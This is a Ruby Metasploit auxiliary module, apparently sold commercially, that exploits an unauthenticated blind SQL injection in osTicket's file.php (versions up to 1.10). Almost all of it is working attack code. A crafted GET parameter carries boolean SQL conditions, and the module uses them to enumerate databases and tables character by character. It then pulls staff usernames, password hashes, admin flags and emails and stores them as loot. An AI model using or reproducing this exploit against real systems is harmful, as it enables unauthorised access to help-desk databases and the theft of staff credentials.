##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'osTicket file.php Blind SQL Injection',
      'Description'    => %q{
    This module exploits an unauthenticated blind SQL injection
    in versions of osTicket <= 1.10.

    osTicket is a popular open-source ticket management system
    written in PHP. Privileged access to an osTicket instance
    could yield great insight into high values targets in
    the company or other sensitive information. This module
    attempts to exploit a vulnerable version (<=1.10) of osTicket
    in order to retrieve the administrative usernames
    and password hashes in the osTicket database.

    Categories: Open Source

    Price: 5

    Video: https://asciinema.org/a/jYsZMgmWvBdP9YxcDlKW2a6Hv

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => 'September 12 2017'
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptBool.new('FORCERUN', [true, 'Run the module whether check passes or not', false])
      ], self.class)
  end

  def check
    true_res = make_injected_request("AND 1549=1549")
    false_res = make_injected_request("AND 1549=1548")

    if true_res.code == 422 and false_res.code == 404
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run

    unless check == Exploit::CheckCode::Vulnerable and !datastore['FORCERUN']
      print_error("Check doesn't believe the target is vulnerable")
      return
    end

    users = []
    dbs = []

    db_count = ''
    tmp = nil
    j = 1
    while tmp != ''
      tmp = ''
      57.downto(48) do |i|
        get_db_count = "AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),#{j},1))=#{i}"
        res = make_injected_request(get_db_count)
        if res.code == 422
          tmp = i.chr
          db_count << tmp
          break
        end
      end
      j = j + 1
    end

    db_count = db_count.to_i

    0.upto(db_count-1) do |db|
      tmp = nil
      j = 1
      db_name = ''
      while tmp != ''
        tmp = ''
        122.downto(36) do |i|
          get_db_name = "AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),#{j},1))=#{i}"
          res = make_injected_request(get_db_name)
          if res.code == 422
            tmp = i.chr
            db_name << tmp
            break
          end
        end
        j = j + 1
      end

      dbs << db_name
    end

    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('sys')
    dbs.delete('mysql')

    dbs.each do |db|
      vprint_good("Searching database #{db}")
      table_count = ''
      tmp = nil
      j = 1
      while tmp != ''
        tmp = ''
        122.downto(36) do |i|
          get_table_count = "AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]}),#{j},1))=#{i}"
          res = make_injected_request(get_table_count)
          if res.code == 422
            tmp = i.chr
            table_count << tmp
            break
          end
        end

        j = j + 1
      end

      table_count = table_count.to_i

      tables = []
      0.upto(table_count-1) do |t|
        tmp = nil
        j = 1
        table_name = ''
        while tmp != ''
          tmp = ''
          122.downto(36) do |i|
            get_table_name = "AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]} LIMIT #{t},1),#{j},1))=#{i}"
            res = make_injected_request(get_table_name)

            if res.code == 422
              tmp = i.chr
              table_name << tmp
              break
            end
          end
          j = j + 1
        end

        vprint_good("Found table #{table_name}")
        if table_name =~ /_staff$/
          tables << table_name
        end
      end

      tables.each do |table|
        vprint_good("Searching table #{table} for staff credentials")

        user_count = ''
        tmp = nil
        j = 1
        while tmp != ''
          tmp = ''
          122.downto(36) do |i|
            get_user_count = "AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),#{j},1))=#{i}"
            res = make_injected_request(get_user_count)

            if res.code == 422
              tmp = i.chr
              user_count << tmp
              break
            end
          end
          j = j + 1
        end

        vprint_good("Found #{user_count} staff users")

        user_count = user_count.to_i

        0.upto(user_count-1) do |u|
          user = {}
          cols = ['passwd', 'username', 'isadmin', 'email']

          cols.each do |col|
            tmp = nil
            j = 1
            col_val = ''
            while tmp != ''
              tmp = ''
              122.downto(36) do |i|
                get_col_val = "AND ORD(MID((SELECT IFNULL(CAST(#{col} AS CHAR),0x20) FROM #{db}.#{table} ORDER BY lang LIMIT #{u},1),#{j},1))=#{i}"
                res = make_injected_request(get_col_val)
                if res.code == 422
                  tmp = i.chr
                  col_val << tmp
                  break
                end
              end
              j = j + 1
            end

            vprint_good(col+":"+col_val)
            user[col] = col_val
          end

          users << user
        end
      end
    end

    p = store_loot("osticket.staff", "appliaction/javascript", datastore['RHOST'], users.to_json, "#{datastore['RHOST']}_osticket_staff.txt", "osTicket Staff Users", "User credentials for osTicket staff")
    print_good("User credentials stored in file: #{p}")
  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'file.php'),
      'vars_get' => {
        "key[id`=1 #{sql} #]" => 1,
        'signature' => 1,
        'expires' => 15104725312
      }
    })
  end
end

